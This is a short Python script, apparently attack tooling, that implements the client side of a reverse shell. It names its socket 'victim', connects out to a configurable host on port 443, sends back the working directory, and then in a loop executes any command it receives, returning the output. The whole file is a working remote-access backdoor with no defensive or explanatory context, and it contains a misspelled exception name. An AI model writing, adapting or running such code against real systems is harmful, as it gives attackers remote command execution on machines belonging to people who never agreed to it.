#coded by cybereagle2001

import socket 
import os
import subprocess
import sys

server_host ='127.0.0.1' #sys.argv[1]
server_port = 443
data_size = 1024 * 128
SEPARATOR = "<sep>"
victim = socket.socket()
victim.connect((server_host,server_port))
cmd = os.getcwd()
victim.send(cmd.encode())

while True:
    command = victim.recv(data_size).decode()
    splited_command= command.split()
    if command.lower() == "exit":
        break
    if splited_command[0].lower() == "cd":
        try:
            os.chdir(''.join(splited_command[1:]))
        except FileNotFounfError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(command)
    cmd = os.getcwd()
    message = f"{output}{SEPARATOR}{cmd}"
    victim.send(message.encode())
victim.close()
